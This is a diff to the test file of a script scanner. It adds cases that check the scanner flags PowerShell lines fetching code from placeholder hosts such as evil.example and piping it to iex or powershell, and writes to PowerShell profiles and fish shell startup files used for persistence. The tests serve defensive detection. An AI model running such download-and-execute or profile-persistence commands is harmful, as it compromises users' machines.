@@ -279,8 +279,13 @@ test('a shell script is read whole for its shell commands and the places it name
   ].join('\n')), { shell: [1, 2, 3], persistence: [4, 5] }, 'PowerShell running what it fetches, and its profile')
   assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\niex $x && iwr https://x.example/f -OutFile f\niex (irm https://evil.example/p | Out-String)\n'), { shell: [1, 3, 8] },
     'its line continued by a backtick, not the next line')
+  assert.deepEqual(found('setup.ps1', `iwr https://evil.example/p -Headers @{Authorization="Bearer ${'x'.repeat(1500)}"} | iex\nGet-Content p.ps1 | powershell\ntype p.ps1 | powershell.exe\n`), { shell: [1, 2, 3] },
+    'long options before the pipe, and a pipe to Windows PowerShell')
   assert.deepEqual(found('setup.ps1', 'Set-Content "$HOME\\Documents\\PowerShell\\Profile.ps1" $p\nAdd-Content $PSHOME\\Profile.ps1 $p\n& ./scripts/profile.ps1\n'), { persistence: [1, 2] },
     'PowerShell\'s all hosts\' profile, not another folder\'s profile.ps1')
+  assert.deepEqual(found('install.sh', 'echo "$p" >> ~/.config/fish/config.fish\ncp p.fish ~/.config/fish/conf.d/p.fish\ncp x.conf /etc/nginx/conf.d/x.conf\nsource ./config.fish\n'), { persistence: [1, 2] },
+    'fish\'s startup files, not another conf.d nor config.fish')
+  assert.deepEqual(found('a.js', "appendFileSync(join(homedir(), '.config', 'fish', 'config.fish'), p)\n"), { persistence: [1] }, 'fish\'s named by its parts')
   assert.deepEqual(found('a.js', "appendFileSync(join(homedir(), 'Documents', 'WindowsPowerShell', 'profile.ps1'), p)\n"), { persistence: [1] }, 'and named by its parts')
   assert.equal(found('setup.sh', 'x=\u0060date\u0060 # curl https://x.example/x\n'), null, 'sh\'s backticks no escapes')
   assert.equal(found('bin/setup', '#!/usr/bin/env pwsh\n<# curl https://x.example/install #>\nWrite-Host ok\n'), null, 'PowerShell\'s comments by its hashbang')
@@ -361,6 +366,8 @@ test('a text reads in time as its length, what is left open read to its end', { 
     [`'npm'${' '.repeat(1e6)}'publish'\n`, { publish: [1] }],
     [`"${'curl '.repeat(2e5)}"\n`, null],
     [`"${'certutil '.repeat(2e5)}"\n`, null],
+    [`"${'iwr '.repeat(2e5)}"\n`, null],
+    [`"iwr ${'x'.repeat(1e6)} | iex"\n`, null],
     [`${"'.claude', ".repeat(1e5)}'settings.json'\n`, { persistence: [1] }],
     [`${"'curl', ".repeat(1e5)}'https://x'\n`, { shell: [1] }],
     [`'curl', '${'x'.repeat(1e6)}', ${"'-x', ".repeat(1e5)}'https://x'\n`, null],
